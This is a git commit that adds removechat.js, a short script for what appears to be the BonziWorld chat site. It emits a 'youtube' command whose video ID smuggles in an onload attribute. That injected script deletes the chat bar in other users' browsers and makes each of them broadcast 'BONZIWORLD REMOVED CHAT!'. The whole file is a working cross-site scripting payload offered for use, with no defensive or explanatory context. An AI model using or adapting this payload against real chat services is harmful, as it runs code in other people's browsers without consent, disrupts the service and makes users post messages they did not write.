2f4587573d851f3113718fce9e76e25f90535613
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-03-09 14:35:15 -0300

    Create removechat.js

---
+++ removechat.js
@@ -0,0 +1,6 @@
+socket.emit('command', {
+  list: [
+    'youtube',
+    "VIDEO_ID\" onload='document.getElementById(\"chat_bar\").remove();window.socket.emit(\"talk\",{text:\"BONZIWORLD REMOVED CHAT!\"});'"
+  ]
+});
